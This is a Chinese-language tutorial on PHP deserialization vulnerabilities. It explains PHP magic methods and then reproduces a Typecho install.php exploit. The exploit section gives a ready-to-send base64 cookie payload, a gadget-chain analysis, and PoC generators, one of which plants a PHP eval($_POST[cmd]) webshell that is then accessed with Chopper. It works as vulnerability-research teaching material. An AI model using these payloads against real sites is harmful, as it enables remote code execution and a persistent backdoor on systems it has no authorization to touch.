---
description: 主要介绍反序列化漏洞的利用方法和一些已知cms的反序列化漏洞，在本篇中我将方法和函数混淆使用，一般面向对象中都称之为方法。
---

# PHP反序列化漏洞

php中通过两个函数即可实相对象的序列化（serialize）和反序列化（unserialize），而漏洞的利用主要是通过一些可以利用的函数或者类重写的魔术函数来一步一步的达到恶意代码执行的目的。

## PHP的魔术函数

> 魔术（magic）函数命名是以符号\_\_\(两个下划线\)开头的，在特定的情况下调用

1. \_\_construct\(\),类的构造函数 php中构造函数也是在对象创建完成后第一个被对象调用的方法，但是在php中同一个类只能声明一个构造方法，原因是，php不支持构造函数的重载
2. \_\_destruct\(\),析构方法 析构方法在销毁一个对象前执行的一系列操作或完成一些功能，php中析构函数不能带有任何参数（一般不会有漏洞）
3. \_\_call\(\)方法，在对象中调用一个不可访问方法时调用 \_\__call方法一般有两个参数（$function\_name,array $arguments），第一个参数用来传递不可用的方法的名字，第二个参数是一个数组，用来接收传递的参数列表。_ call方法主要是为了避免程序中调用了不存在的方法时产生的错误，而意外的导致程序的终止。
4. \_\_callStatic\(\)方法，用静态方式去调用\[O::F\(\)\]一个不可访问的方法时调用 与\_\_call方法类似
5. \_\_get\(\),当访问一个不可访问的属性时调用 默认有一个参数name，用来传递不可访问属性名
6. \_\_set\(\),在给一个不可以访问的属性赋值时会调用此方法 默认两个参数（$name,$value），用来传递属性名和值
7. \_\_isset\(\),当对不可访问属性调用isset\(\),或empty\(\)时调用
8. \_\_unset\(\) 当对不可访问属性调用 unset\(\) 时会被调用
9. \_\_sleep\(\)serialize\(\) 函数会检查类中是否存在一个魔术方法 \_\_sleep\(\)。如果存在，该方法会先被调用，然后才执行序列化操作 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E\_NOTICE 级别的错误。
10. \_\_wakeup\(\),unserialize\(\) 会检查是否存在一个 wakeup\(\) 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。
11. \_\_toString\(\),当一个类被当做字符串调用时会调用该函数 例如echo $Ob   或者  $str = "str".$Ob此方法必须返回一个字符串，否则将发出一条 E\_RECOVERABLE\_ERROR 级别的致命错误。
12. \_\_invoke\(\),调用函数的方式调用一个对象时调用该方法  本特性只在 PHP 5.3.0 及以上版本有效
13. \_\_set\_state\(\)自 PHP 5.1.0 起当调用 var\_export\(\) 导出类时，此静态 方法会被调用  
    本方法的唯一参数是一个数组，其中包含按 array\('property' =&gt; value, ...\) 格式排列的类属性。

    ```php
    <?php

    class A
    {
        public $var1;
        public $var2;

        public static function __set_state($an_array) // As of PHP 5.1.0
        {
            $obj = new A;
            $obj->var1 = $an_array['var1'];
            $obj->var2 = $an_array['var2'];
            return $obj;
        }
    }

    $a = new A;
    $a->var1 = 5;
    $a->var2 = 'foo';

    eval('$b = ' . var_export($a, true) . ';'); // $b = A::__set_state(array(
                                                //    'var1' => 5,
                                                //    'var2' => 'foo',
                                                // ));
    var_dump($b);

    ?>

    //输出

    object(A)#2 (2) {
      ["var1"]=>
      int(5)
      ["var2"]=>
      string(3) "foo"
    }
    ```

14. \_\_clone\(\)利用clone关键字来进行对象复制，当复制完的时候，如果定义了 clone\(\) 方法，_**则新创建的对象**_**（复制生成的对象）中的 clone\(\) 方法会被调用。**
15. \_\_debugInfo\(\)，打印所需调试信息，该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。
16. \_\_autoload — 尝试加载未定义的类  
    ****

    ```php
    function __autoload($classname) {
        $filename = "./". $classname .".php";
        include_once($filename);
    }
    ```

## Typecho 反序列化漏洞复现

访问install.php

```text
http://IP/typecho/install.php?finish
```

使用hackbar,将Referrer设置为IP地址，将Cookies设置为以下值，并发送数据包：

```text
__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=
```

![&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;](https://p408.ssl.qhimgs4.com/t012be0b81b95d1a5b6.png)

可以看到任意代码执行。

## Typecho漏洞分析

1.漏洞的入口位置在install.php的第232行  


![](../.gitbook/assets/image%20%2813%29.png)

  
当存在cookie名为\_\_typecho\_config时，会将该值base64解码后进反序列化，并将反序列化后的对象赋给$config变量。然后将该cookie删除。第三步按config中的adapter和prefix的值建立Typecho\_Db对象。那么看一下Typecho\_Db的构造函数

![](../.gitbook/assets/image%20%2876%29.png)

此处好像没什么可以利用的地方，但是在第120行

```text
$adapterName = 'Typecho_Db_Adapter_' . $adapterName;
```

会将$adapterName变量做一次字符串链接，如果该变量是一个对象则会默认调用\_\_toString方法，全局搜索\_\_toString方法，看看是否存在可以利用的类。

![](../.gitbook/assets/image%20%2842%29.png)

可以看到这三个类重写了toString函数，跟进去第一个看看Feed.php

![](../.gitbook/assets/image%20%286%29.png)

第241行调用了dataFormat函数，跟过去看看有没有能利用的地方  


![dataFormat&#x51FD;&#x6570;](../.gitbook/assets/image%20%2881%29.png)

好像并没有什么能够利用的函数，继续返回toString函数寻找，发现第243行调用了empty\(\)函数，搜索一下看看有没有重写的\_\_isset\(\)可以利用（虽然一般不会有，但是也要尝试一下）

![](../.gitbook/assets/image%20%2865%29.png)

果然没有能用的到的，继续toString方法往下寻找

![](../.gitbook/assets/image%20%2838%29.png)

第290行发现调用了screenName变量，我们知道当对象访问一个不可访问或者没有的变量时会调用\_\_get方法，搜索一下看看

![](../.gitbook/assets/image%20%2894%29.png)

类太多，不一一举例，我们直接查看Typecho\_Request类，发现该类并没有中creenName变量符合我们使用，查看该类\_\_get方法直接调用了get\(\)方法，跟过去看一下

![](../.gitbook/assets/image%20%2871%29.png)

而且$value=\_params\[$key\]可以直接构造一个值传过去，然后这个值会传到\_applyFilter函数

![](../.gitbook/assets/image%20%2849%29.png)

函数中会调用call\_user\_func\(\)函数可以被利用，来执行任意函数，然后再借助assert函数来执行任意php语句

![](../.gitbook/assets/image%20%2863%29.png)

![](../.gitbook/assets/image%20%2812%29.png)

### 构造poc

```php
<?php
class Typecho_Request {
    private $_params = array();
    private $_filter = array();

    function __construct()
    {
        $this->_params['screenName'] = "phpinfo();";
        $this->_filter [0]= 'assert';
    }
}
$tr = new Typecho_Request();

class Typecho_Feed{
    private $_type;
    private $_items = array();

    function __construct($o)
    {
        $this->_type = 'RSS 2.0';
        $this->_items[0]['author']=$o;

    }
}
$tr2 = new Typecho_Feed($tr);

$paylod = array();
$paylod['adapter'] = $tr2;
$paylod['prefix'] = 'typecho_';

echo base64_encode(serialize($paylod));
echo '<br><br><br><br>';
echo serialize($paylod);
```

![](../.gitbook/assets/image%20%2850%29.png)

互发生报错（但是代码已经执行），是因为typecho开启了ob\_start

![](../.gitbook/assets/image%20%281%29.png)

 这里开启了ob\_start的话会让脚本没有回显，同时我们的exp会触发自有的exception

![](../.gitbook/assets/image%20%2832%29.png)

解决方法有两个

1. 因为 call\_user\_func 函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。
2. 第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 同时给出了他的payload

我们再去看一下代码

![](../.gitbook/assets/image%20%28100%29.png)

我们可以借助category来随便传一个对象，当程序调用时触发致命错误，导致程序直接退出，出现回显。  


![](../.gitbook/assets/image%20%2854%29.png)

构造POC上传一句话木马。POC：

```php
<?php
/**
 * Created by PhpStorm.
 * User: 10326
 * Date: 2018/10/16
 * Time: 22:34
 */
class Typecho_Request {
    private $_params = array();
    private $_filter = array();

    function __construct()
    {
        $this->_params['screenName'] = "file_put_contents('test.php', '<?php @eval(".'$_POST[cmd]);'." ?>')";
        $this->_filter [0]= 'assert';
    }
}
$tr = new Typecho_Request();

class Typecho_Feed{
    private $_type;
    private $_items = array();

    function __construct($o)
    {
        $this->_type = 'RSS 2.0';
        $this->_items[0]['author']=$o;
        $this->_items[0]['category']=array($o);

    }
}
$tr2 = new Typecho_Feed($tr);

$paylod = array();
$paylod['adapter'] = $tr2;
$paylod['prefix'] = 'typecho_';

echo base64_encode(serialize($paylod));
echo '<br><br><br><br>';
echo serialize($paylod);
```

输出（第一行是base64编码后的payload，下面那行只是为了显示看看的）：

```text
YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo2MToiZmlsZV9wdXRfY29udGVudHMoJ3Rlc3QucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtjbWRdKTsgPz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319czo4OiJjYXRlZ29yeSI7YToxOntpOjA7cjo2O319fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==



a:2:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:19:"Typecho_Feed_type";s:7:"RSS 2.0";s:20:"Typecho_Feed_items";a:1:{i:0;a:2:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:61:"file_put_contents('test.php', '')";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}s:8:"category";a:1:{i:0;r:6;}}}}s:6:"prefix";s:8:"typecho_";}
```

菜刀链接：

![](../.gitbook/assets/image%20%2867%29.png)



